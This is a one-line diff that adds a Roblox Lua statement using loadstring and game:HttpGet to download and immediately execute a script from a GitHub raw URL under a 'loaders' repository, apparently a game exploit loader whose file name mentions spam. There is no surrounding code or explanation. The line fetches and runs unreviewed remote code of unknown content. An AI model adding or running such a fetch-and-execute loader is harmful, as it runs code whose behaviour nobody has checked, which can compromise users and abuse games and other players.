@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/cure-violence-district-spam4-mcrvxmjyee7zn9.lua"))()
